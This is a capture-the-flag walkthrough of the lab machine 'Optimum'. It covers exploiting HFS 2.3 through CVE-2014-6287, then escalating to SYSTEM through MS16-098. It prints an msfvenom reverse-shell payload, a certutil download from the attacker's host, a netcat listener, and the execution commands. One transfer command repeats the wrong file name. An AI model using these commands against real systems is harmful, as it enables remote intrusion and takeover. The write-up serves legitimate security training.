# Optimum

## Nmap

```
sudo nmap 10.10.10.8 -p- -sS -sV   

PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Browsing to the only port available we have a web page titled 'HFS" and we can see 'HttpFileServer 2.3'

![http://10.10.10.8/](<../../../.gitbook/assets/image (1651).png>)

Researching exploits for this we come to: [CVE-2014-6287](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6287).

**Description:**

The findMacroMarker function in parserLib.pas in Rejetto HTTP File Server (aks HFS or HttpFileServer) 2.3x before 2.3c allows remote attackers to execute arbitrary programs via a %00 sequence in a search action.

Searching for exploits on exploit-db.com we have the following PoC available:

{% embed url="https://www.exploit-db.com/exploits/49584" %}

I downloaded the exploit and amended the correct information for the variables shown below:

![](<../../../.gitbook/assets/image (1652).png>)

Executing the exploit next we get a shell on the target system as the user 'kostas'.

![](<../../../.gitbook/assets/image (1653).png>)

Now that we are on the system I was able to use the `systeminfo` command to pull system information. I copied this to a text file on my attacking machine and run this against windows-exploit-suggester.py which I have linked below:

{% embed url="https://github.com/AonCyberLabs/Windows-Exploit-Suggester" %}

After running windoiws-exploit-suggester.py we get the results below:

![](<../../../.gitbook/assets/image (1654).png>)

Where it is reported that the target system is vulnerable to a RGNOBJ Interger Overflow otherwise known as MS16-098.

`Description of MS16-098`:

This security update resolves vulnerabilities in Microsoft Windows. The vulnerabilities could allow elevation of privilege if an attacker logs on to an affected system and runs a specially crafted application that could exploit the vulnerabilities and take control of an affected system.

This security update is rated Important for all supported releases of Windows. For more information, see the **Affected Software and Vulnerability Severity Ratings** section.

The security update addresses the vulnerabilities by correcting how the Windows kernel-mode driver handles objects in memory. For more information about the vulnerabilities, see the **Vulnerability Information** section.

{% embed url="https://docs.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-098" %}

I downloaded a precompiled binary from the follow GitHub:

{% embed url="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-098" %}

Before transferring the binary over we need to gain a `cmd.exe` shell as the current PS shell is bound. I will use `msfvenom` to generate a reverse shell on my attacking machine.

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.29 LPORT=443 -f exe -o Shell.exe
```

![](<../../../.gitbook/assets/image (1655).png>)

I then started a Python SimpleHTTPServer on my attacking machine to host the `msfvenom` binary.

```
sudo python2 -m SimpleHTTPServer 80
```

Then on the attacking machine used `certutil.exe` to download the `msfvenom` binary.

```
certutil.exe -f -urlcache -split http://10.10.14.29/Shell.exe
```

![](<../../../.gitbook/assets/image (1656).png>)

Then set a `netcat` listener on my attacking machine to the port specified in the `msfvenom` binary.

```
sudo nc -lvp 443
```

Then executed the shell on the target system to gain a `cmd.exe` shell.

```
cmd.exe /c shell.exe
```

![](<../../../.gitbook/assets/image (1658).png>)

From here I then transferred the MS16-098 binary 'bfill.exe' over to the target system.

```
certutil.exe -f -urlcache -split http://10.10.14.29/Shell.exe
```

With the binary now on the target system I executed it with the following command to gain a SYSTEM shell.

```
cmd.exe /c bfill.exe
```

![](<../../../.gitbook/assets/image (1659).png>)
